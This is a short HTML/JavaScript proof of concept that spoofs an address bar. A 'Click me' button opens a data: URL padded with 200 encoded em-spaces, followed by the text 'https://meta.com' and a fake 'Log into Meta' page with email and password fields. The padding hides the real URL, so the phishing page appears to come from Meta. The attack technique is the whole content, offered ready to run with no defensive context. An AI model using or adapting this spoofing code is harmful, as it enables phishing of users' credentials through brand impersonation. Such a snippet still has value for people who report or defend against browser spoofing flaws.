<script>
function spoof() {
  // add long padding with encoded whitespace (U+2003 em-space)
  const padding = "%E2%80%83".repeat(200); 

  // simple fake Meta login page
  const fakePage = `
    <html>
    <body style="font-family:Arial; text-align:center; padding-top:50px;">
      <h2>Log into Meta</h2>
      <input placeholder="Email or Phone"><br><br>
      <input type="password" placeholder="Password"><br><br>
      <button>Log In</button>
    </body>
    </html>
  `;

  // build the data URL
  const url = "data:text/html," + padding + "https://meta.com" + fakePage;

  window.open(url, "_blank");
}
</script>

<button onclick="spoof()">Click me</button>
